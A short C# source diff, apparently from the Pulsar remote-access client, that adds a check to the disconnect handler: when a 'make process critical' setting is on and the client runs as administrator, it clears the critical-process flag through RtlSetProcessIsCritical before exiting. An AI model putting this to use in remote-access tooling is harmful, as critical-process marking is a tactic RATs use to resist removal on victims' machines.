@@ -11,6 +11,7 @@ using Pulsar.Common.Messages;
 using Pulsar.Common.Messages.ClientManagement;
 using Pulsar.Common.Messages.Other;
 using Pulsar.Common.Networking;
+using Pulsar.Common.UAC;
 using System;
 using System.Diagnostics;
 using System.Text;
@@ -88,6 +89,11 @@ namespace Pulsar.Client.Messages
 
         private void Execute(ISender client, DoClientDisconnect message)
         {
+            if (Settings.MAKEPROCESSCRITICAL && UAC.IsAdministrator())
+            {
+                NativeMethods.RtlSetProcessIsCritical(0, 0, 0);
+            }
+
             _client.Exit();
         }
 
